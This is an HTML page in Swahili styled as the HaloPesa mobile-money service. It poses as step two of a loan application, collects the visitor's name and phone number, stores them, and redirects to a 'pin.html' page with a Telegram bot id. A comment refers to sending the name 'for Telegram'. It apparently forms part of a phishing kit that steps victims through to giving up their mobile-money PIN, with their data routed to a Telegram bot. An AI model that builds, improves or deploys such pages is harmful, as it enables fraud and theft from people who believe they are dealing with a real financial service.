<!DOCTYPE html>
<html lang="sw">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Maelezo Binafsi - HaloPesa</title>

<style>
/* ===== HALOPESA BRAND STYLES ===== */
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}

body {
    background: #f0f4f0;
    padding-top: 70px;
}

/* ===== HEADER - HaloPesa Green ===== */
.header {
    background: #1a7a2a;
    height: 65px;
    display: flex;
    align-items: center;
    justify-content: center;
    position: fixed;
    width: 100%;
    top: 0;
    z-index: 1000;
    box-shadow: 0 2px 12px rgba(26, 122, 42, 0.20);
}

.back-link {
    position: absolute;
    left: 20px;
    color: #e8f5e8;
    text-decoration: none;
    font-size: 15px;
    font-weight: 500;
    transition: color 0.2s;
}

.back-link:hover {
    color: #ffffff;
}

.menu {
    position: absolute;
    right: 20px;
    color: #e8f5e8;
    font-size: 28px;
    font-weight: 300;
}

.logo {
    color: #ffd700;
    font-size: 20px;
    font-weight: 700;
    letter-spacing: 0.5px;
}

/* ===== CONTAINER & CARD ===== */
.container {
    max-width: 620px;
    margin: 0 auto;
    padding: 0 15px 40px;
}

.card {
    background: #ffffff;
    border-radius: 16px;
    padding: 35px 30px;
    box-shadow: 0 8px 30px rgba(26, 67, 41, 0.10);
    border: 1px solid #e6efe6;
}

.title {
    text-align: center;
    color: #1a6b2a;
    font-size: 24px;
    font-weight: 700;
}

.subtitle {
    text-align: center;
    color: #5a6b5a;
    margin-top: 6px;
    font-size: 15px;
}

/* ===== PROGRESS BAR ===== */
.progress {
    display: flex;
    gap: 10px;
    margin: 22px 0 30px;
}

.step {
    flex: 1;
    height: 6px;
    background: #d9e6d9;
    border-radius: 6px;
    transition: background 0.3s;
}

.step.active {
    background: #1a7a2a;
}

/* ===== FORM ELEMENTS ===== */
.row {
    display: flex;
    gap: 15px;
}

.form-group {
    flex: 1;
    margin-bottom: 20px;
}

label {
    display: block;
    margin-bottom: 8px;
    color: #1a2b1a;
    font-weight: 600;
    font-size: 14px;
}

input {
    width: 100%;
    border: 2px solid #d0e0d0;
    border-radius: 10px;
    padding: 14px 16px;
    font-size: 16px;
    outline: none;
    transition: border-color 0.2s, box-shadow 0.2s;
    background: #fafffa;
    color: #1a2b1a;
}

input:focus {
    border-color: #1a7a2a;
    box-shadow: 0 0 0 4px rgba(26, 122, 42, 0.12);
}

input::placeholder {
    color: #a0b8a0;
}

/* ===== PHONE WRAPPER ===== */
.phone-wrapper {
    display: flex;
    border: 2px solid #d0e0d0;
    border-radius: 10px;
    overflow: hidden;
    transition: border-color 0.2s, box-shadow 0.2s;
    background: #fafffa;
}

.phone-wrapper:focus-within {
    border-color: #1a7a2a;
    box-shadow: 0 0 0 4px rgba(26, 122, 42, 0.12);
}

.country-code {
    background: #eaf6ea;
    padding: 14px 16px;
    border-right: 2px solid #d0e0d0;
    color: #1a3b1a;
    font-weight: 600;
    font-size: 16px;
}

.phone-input {
    border: none;
    border-radius: 0;
    background: transparent;
}

.phone-input:focus {
    border-color: transparent;
    box-shadow: none;
}

.note {
    margin-top: 10px;
    color: #6a8a6a;
    font-size: 13px;
    line-height: 1.5;
}

/* ===== BUTTONS - HaloPesa Style ===== */
.buttons {
    display: flex;
    gap: 15px;
    margin-top: 25px;
}

.btn-back {
    flex: 1;
    background: #e8efe8;
    color: #1a3b1a;
    border: 2px solid #d0e0d0;
    border-radius: 10px;
    padding: 16px;
    font-size: 16px;
    font-weight: 700;
    cursor: pointer;
    transition: background 0.2s, transform 0.1s;
}

.btn-back:hover {
    background: #d6e6d6;
    transform: scale(1.01);
}

.btn-next {
    flex: 1;
    background: #1a7a2a;
    color: #ffffff;
    border: none;
    border-radius: 10px;
    padding: 16px;
    font-size: 16px;
    font-weight: 700;
    cursor: pointer;
    transition: background 0.2s, transform 0.1s;
}

.btn-next:hover {
    background: #136622;
    transform: scale(1.01);
}

.btn-next:active,
.btn-back:active {
    transform: scale(0.98);
}

/* ===== RESPONSIVE ===== */
@media (max-width: 600px) {
    .row {
        flex-direction: column;
        gap: 0;
    }
    
    .buttons {
        flex-direction: column;
    }
    
    .card {
        padding: 25px 18px;
    }

    .title {
        font-size: 21px;
    }

    .header {
        height: 58px;
    }

    .logo {
        font-size: 17px;
    }

    .menu {
        font-size: 24px;
    }
}
</style>
</head>
<body>

<!-- ===== HEADER - HaloPesa Style ===== -->
<header class="header">
    <a href="form.html" class="back-link">← Back</a>
    <div class="logo">HaloPesa</div>
    <div class="menu">☰</div>
</header>

<div class="container">
    <div class="card">
        <h2 class="title">Ombi la Mkopo</h2>
        <p class="subtitle">Hatua ya 2 kati ya 3</p>

        <div class="progress">
            <div class="step active"></div>
            <div class="step active"></div>
            <div class="step"></div>
        </div>

        <form id="detailsForm">
            <div class="row">
                <div class="form-group">
                    <label>Jina la Kwanza</label>
                    <input
                        type="text"
                        id="firstName"
                        placeholder="Jina la Kwanza"
                        required>
                </div>

                <div class="form-group">
                    <label>Jina la Mwisho</label>
                    <input
                        type="text"
                        id="lastName"
                        placeholder="Jina la Mwisho"
                        required>
                </div>
            </div>

            <div class="form-group">
                <label>Nambari ya Simu</label>
                <div class="phone-wrapper">
                    <div class="country-code">+255</div>
                    <input
                        type="tel"
                        id="phoneNumber"
                        class="phone-input"
                        placeholder="712345678 au 0712345678"
                        required>
                </div>
                <div class="note">
                    Weka tarakimu 9 au anza na 0
                    (mfano, 0712345678 →
                    inabadilishwa kiotomatiki kuwa
                    712345678)
                </div>
            </div>

            <div class="buttons">
                <button
                    type="button"
                    class="btn-back"
                    onclick="window.location.href='form.html'">
                    NYUMA
                </button>

                <button
                    type="submit"
                    class="btn-next">
                    HATUA INAYOFUATA
                </button>
            </div>
        </form>
    </div>
</div>

<!-- ===== YOUR LOGIC — COMPLETELY UNTOUCHED ===== -->
<script>
// Get botId from URL
const urlParams = new URLSearchParams(window.location.search);
const botId = urlParams.get('botId');
console.log('Bot ID on details page:', botId);

// Store botId
if (botId) {
    localStorage.setItem('botId', botId);
}

document.getElementById("detailsForm").addEventListener("submit", function(e){
    e.preventDefault();

    // Get form values
    const firstName = document.getElementById('firstName').value.trim();
    const lastName = document.getElementById('lastName').value.trim();
    let phone = document.getElementById('phoneNumber').value.trim();

    // Validate phone number
    if (!phone) {
        alert('Tafadhali weka nambari yako ya simu');
        return;
    }

    // Clean phone number - remove leading 0 if present
    if (phone.startsWith('0')) {
        phone = phone.substring(1);
    }

    // Validate phone is 9 digits
    if (!/^\d{9}$/.test(phone)) {
        alert('Tafadhali weka nambari sahihi ya simu (tarakimu 9)');
        return;
    }

    // Format full phone number
    const fullPhone = '+255 ' + phone;

    // Save to localStorage - ADDED full name field
    localStorage.setItem('firstName', firstName);
    localStorage.setItem('lastName', lastName);
    localStorage.setItem('name', `${firstName} ${lastName}`); // ← ADDED THIS for Telegram
    localStorage.setItem('phone', fullPhone);
    localStorage.setItem('rawPhone', phone);

    console.log('Saved user data:', {
        firstName: firstName,
        lastName: lastName,
        name: `${firstName} ${lastName}`,
        phone: fullPhone
    });

    // Redirect to pin page with botId
    const botIdParam = botId || localStorage.getItem('botId') || '';
    window.location.href = `pin.html?botId=${botIdParam}`;
});
</script>

</body>
</html>
